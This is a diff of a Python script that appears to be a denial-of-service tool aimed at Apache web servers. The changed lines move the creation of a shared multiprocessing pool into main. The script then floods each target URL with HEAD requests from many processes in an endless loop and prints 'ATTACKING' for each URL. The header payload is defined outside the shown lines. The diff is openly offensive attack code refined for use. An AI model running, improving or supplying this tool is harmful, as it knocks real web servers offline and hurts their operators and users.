@@ -47,8 +47,7 @@ def testapache(urls):
 def _kill(url):
      r = requests.head(url, headers=headers)
     
-def killapache(urls, processes):
-    pool = Pool(processes=processes)
+def killapache(urls,processes, pool):
     for url in urls:
         print "ATTACKING {url} [using {processes} processes]".format(url=url, processes=processes)
         pool.map(_kill, [url for i in range(processes)], 1)
@@ -72,10 +71,11 @@ def main():
     )
     
     args = parser.parse_args()
-
+    
     if (testapache(args.urls) and not args.dry):
+        pool = Pool(processes=args.processes)
         while True:
-            killapache(args.urls, args.processes)
+            killapache(args.urls, args.processes, pool)
     
     return 0
 
